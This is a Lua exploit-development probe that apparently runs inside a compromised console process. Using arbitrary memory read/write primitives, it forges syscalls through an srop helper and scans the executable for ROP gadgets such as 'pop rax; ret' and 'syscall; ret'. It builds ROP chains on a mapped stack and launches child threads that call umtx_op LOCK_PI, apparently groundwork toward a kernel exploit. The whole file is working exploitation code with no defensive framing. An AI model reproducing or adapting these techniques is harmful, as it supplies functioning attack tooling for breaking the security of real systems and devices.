-- CRASH_CLASS: LOW
-- PROBE 142g: Scan eboot for ROP gadgets, then use ROP chain in child thread
--
-- 142f: child thread executes but doesn't block on LOCK_PI. Theory:
-- thr_create's set_mcontext may zero RAX. ROP chain bypasses this by
-- explicitly loading RAX from the stack via `pop rax; ret` gadget.

print("=== PROBE 142g: GADGET+ROP THR ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- Mcontext layout (confirmed by 142d/142e)
local MC = 0x40
local O_RDI = MC + 0x08
local O_RSI = MC + 0x10
local O_RDX = MC + 0x18
local O_R8  = MC + 0x28
local O_R9  = MC + 0x30
local O_RAX = MC + 0x38
local O_R10 = MC + 0x50
local O_RIP = MC + 0xA0
local O_RSP = MC + 0xB8

local base_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(base_ctx)) end)
local base_rip = rq(base_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(base_ctx)) end)
    wq(base_ctx + O_RIP, sc_addr)
    wq(base_ctx + O_RAX, uint64(num))
    if a1 then wq(base_ctx + O_RDI, a1) end
    if a2 then wq(base_ctx + O_RSI, a2) end
    if a3 then wq(base_ctx + O_RDX, a3) end
    if a4 then wq(base_ctx + O_R10, a4) end
    if a5 then wq(base_ctx + O_R8, a5) end
    if a6 then wq(base_ctx + O_R9, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(base_ctx)) end)
    return rv
end

local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(500000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

-- Get eboot base address via dynlib_get_info(593) handle 0
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), uint64(info)) end)
local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi or 0, eboot_lo or 0))
print("eboot_base=" .. hex(eboot_base))

-- Scan eboot .text for gadgets
-- Eboot .text is RX, safe to read
-- Patterns:
--   58 C3        = pop rax; ret
--   0F 05 C3     = syscall; ret
--   5F C3        = pop rdi; ret
--   5E C3        = pop rsi; ret
--   5A C3        = pop rdx; ret
--   C3           = ret
--   41 5A C3     = pop r10; ret (actually this is pop r10d)

print("")
print("--- Gadget scan ---")

local gadgets = {
    pop_rax = nil,  -- 58 C3
    syscall_ret = nil,  -- 0F 05 C3
    pop_rdi = nil,  -- 5F C3
    pop_rsi = nil,  -- 5E C3
    pop_rdx = nil,  -- 5A C3
    ret = nil,  -- C3
}

-- Scan first 2MB of eboot .text
local scan_size = 0x200000
local found = 0
for off = 0, scan_size - 3, 1 do
    if found >= 6 then break end

    local ok, b0 = pcall(function() return to_num(memory.read_byte(eboot_base + off)) end)
    if not ok then break end
    local ok2, b1 = pcall(function() return to_num(memory.read_byte(eboot_base + off + 1)) end)
    if not ok2 then break end

    -- ret
    if b0 == 0xC3 and not gadgets.ret then
        gadgets.ret = off
        found = found + 1
    end

    -- pop rax; ret
    if b0 == 0x58 and b1 == 0xC3 and not gadgets.pop_rax then
        gadgets.pop_rax = off
        found = found + 1
        print("pop_rax: eboot+0x" .. string.format("%X", off))
    end

    -- pop rdi; ret
    if b0 == 0x5F and b1 == 0xC3 and not gadgets.pop_rdi then
        gadgets.pop_rdi = off
        found = found + 1
        print("pop_rdi: eboot+0x" .. string.format("%X", off))
    end

    -- pop rsi; ret
    if b0 == 0x5E and b1 == 0xC3 and not gadgets.pop_rsi then
        gadgets.pop_rsi = off
        found = found + 1
        print("pop_rsi: eboot+0x" .. string.format("%X", off))
    end

    -- pop rdx; ret
    if b0 == 0x5A and b1 == 0xC3 and not gadgets.pop_rdx then
        gadgets.pop_rdx = off
        found = found + 1
        print("pop_rdx: eboot+0x" .. string.format("%X", off))
    end

    -- syscall; ret (3 bytes)
    if b0 == 0x0F and b1 == 0x05 and not gadgets.syscall_ret then
        local ok3, b2 = pcall(function() return to_num(memory.read_byte(eboot_base + off + 2)) end)
        if ok3 and b2 == 0xC3 then
            gadgets.syscall_ret = off
            found = found + 1
            print("syscall_ret: eboot+0x" .. string.format("%X", off))
        end
    end

    -- Progress every 256KB
    if off > 0 and off % 0x40000 == 0 then
        print("scan: " .. string.format("0x%X", off) .. " found=" .. found)
    end
end

print("ret: eboot+0x" .. string.format("%X", gadgets.ret or 0))
print("gadgets_found=" .. found)

-- If we have the gadgets, build a ROP chain
if gadgets.pop_rax and gadgets.ret then
    print("")
    print("--- ROP chain thread ---")

    -- Main thread acquires LOCK_PI first
    local futex = gpu + 0x1000
    wd(futex, 0)
    local rv_lock = srop(454, ua(futex), uint64(12), uint64(0), uint64(0), uint64(0))
    print("main_LOCK_PI: ret=" .. hex(rv_lock) .. " futex=0x" .. string.format("%X", safe_rd(futex) or 0))

    -- Build ROP chain on GPU stack
    local stack = gpu + 0x50000
    for off = 0, 0x3FFF, 4 do wd(stack + off, 0) end

    -- eboot gadget absolute addresses
    local g_pop_rax = uint64(string.format("0x%X%08X", eboot_hi or 0, (eboot_lo or 0) + gadgets.pop_rax))
    local g_ret = uint64(string.format("0x%X%08X", eboot_hi or 0, (eboot_lo or 0) + gadgets.ret))
    local g_syscall_ret = nil
    if gadgets.syscall_ret then
        g_syscall_ret = uint64(string.format("0x%X%08X", eboot_hi or 0, (eboot_lo or 0) + gadgets.syscall_ret))
    end

    -- Thread context
    local ctx = gpu + 0x40000
    for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
    pcall(function() return sc_gc(uint64(ctx)) end)

    -- Set RIP to `ret` gadget — it will start the ROP chain from RSP
    wq(ctx + O_RIP, g_ret)

    -- Set GPRs for umtx_op LOCK_PI
    wq(ctx + O_RDI, ua(futex))    -- futex (already owned by main)
    wq(ctx + O_RSI, uint64(12))   -- LOCK_PI
    wq(ctx + O_RDX, uint64(0))
    wq(ctx + O_R10, uint64(0))
    wq(ctx + O_R8, uint64(0))

    -- ROP chain layout on stack:
    -- RSP+0x00: pop_rax gadget address
    -- RSP+0x08: 454 (syscall number for umtx_op)
    -- RSP+0x10: syscall;ret (or sc_addr)
    -- RSP+0x18: 0x0 (return after syscall → crash, but by then we're done)
    local rop_base = stack + 0x3000
    wq(rop_base + 0x00, g_pop_rax)                    -- pop rax; ret
    wq(rop_base + 0x08, uint64(454))                   -- → rax = 454
    if g_syscall_ret then
        wq(rop_base + 0x10, g_syscall_ret)             -- syscall; ret
    else
        wq(rop_base + 0x10, sc_addr)                   -- syscall (no ret)
    end
    wq(rop_base + 0x18, uint64(0))                     -- return → crash (but blocked in LOCK_PI)

    wq(ctx + O_RSP, ua(rop_base))

    local tid = gpu + 0x60000
    wq(tid, uint64(0xDEADDEAD))

    print("ROP: pop_rax=" .. hex(g_pop_rax))
    if g_syscall_ret then
        print("ROP: syscall_ret=" .. hex(g_syscall_ret))
    end
    print("pre-futex=0x" .. string.format("%X", safe_rd(futex) or 0))
    print("Creating ROP thread...")

    local ok_r, rv_r = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid), uint64(0))
    end)
    local ntid_r = safe_rq(tid)
    local nrh, nrl = get_hi_lo(ntid_r)
    print("thr_create: ok=" .. tostring(ok_r) .. " rv=" .. tostring(rv_r) .. " tid=" .. nrl)

    -- Wait for thread to enter LOCK_PI
    msleep()

    print("alive pid=" .. to_num(sc20()))
    local fv = safe_rd(futex)
    print("futex=0x" .. string.format("%X", fv or 0))

    if fv and fv ~= 0x1 then
        print("*** FUTEX CHANGED! ***")
        if fv >= 0x80000000 then
            print("*** CONTESTED BIT SET! CHILD THREAD BLOCKED IN LOCK_PI! ***")
            print("*** === THREAD EXECUTION CONFIRMED VIA ROP === ***")
        end
    end

    -- Also test with unowned futex
    print("")
    print("--- ROP: unowned futex ---")
    local futex2 = gpu + 0x2000
    wd(futex2, 0)

    local stack2 = gpu + 0x58000
    for off = 0, 0x3FFF, 4 do wd(stack2 + off, 0) end

    local ctx2 = gpu + 0x48000
    for off = 0, 0x4FF, 4 do wd(ctx2 + off, 0) end
    pcall(function() return sc_gc(uint64(ctx2)) end)

    wq(ctx2 + O_RIP, g_ret)
    wq(ctx2 + O_RDI, ua(futex2))
    wq(ctx2 + O_RSI, uint64(12))
    wq(ctx2 + O_RDX, uint64(0))
    wq(ctx2 + O_R10, uint64(0))
    wq(ctx2 + O_R8, uint64(0))

    -- ROP chain: pop_rax→454, syscall(;ret), pop_rax→431, syscall → thr_exit
    local rop2 = stack2 + 0x3000
    wq(rop2 + 0x00, g_pop_rax)
    wq(rop2 + 0x08, uint64(454))
    if g_syscall_ret then
        wq(rop2 + 0x10, g_syscall_ret)
        -- After LOCK_PI returns: ROP continues
        wq(rop2 + 0x18, g_pop_rax)       -- pop rax; ret
        wq(rop2 + 0x20, uint64(431))      -- → rax = 431 (thr_exit)
        wq(rop2 + 0x28, g_syscall_ret)    -- syscall; ret → thr_exit
    else
        wq(rop2 + 0x10, sc_addr)
    end

    wq(ctx2 + O_RSP, ua(rop2))

    local tid2 = gpu + 0x60010
    wq(tid2, uint64(0xDEADDEAD))

    print("pre-futex2=0x" .. string.format("%X", safe_rd(futex2) or 0))
    print("Creating ROP thread (unowned)...")
    local ok2, rv2 = pcall(function()
        return sc_thr_create(uint64(ctx2), uint64(tid2), uint64(0))
    end)
    local ntid2 = safe_rq(tid2)
    local n2h, n2l = get_hi_lo(ntid2)
    print("rv=" .. tostring(rv2) .. " tid=" .. n2l)

    -- Read immediately
    local f2_imm = safe_rd(futex2)
    print("futex2_imm=0x" .. string.format("%X", f2_imm or 0))

    msleep()

    print("alive pid=" .. to_num(sc20()))
    local f2 = safe_rd(futex2)
    print("futex2=0x" .. string.format("%X", f2 or 0))
    if f2 and f2 ~= 0 then
        print("*** FUTEX2 ACQUIRED BY CHILD! val=0x" .. string.format("%X", f2) .. " ***")
        print("*** === THREAD EXECUTION + LOCK_PI CONFIRMED === ***")
    end
else
    print("MISSING GADGETS - need pop_rax and ret at minimum")
end

print("=== DONE ===")
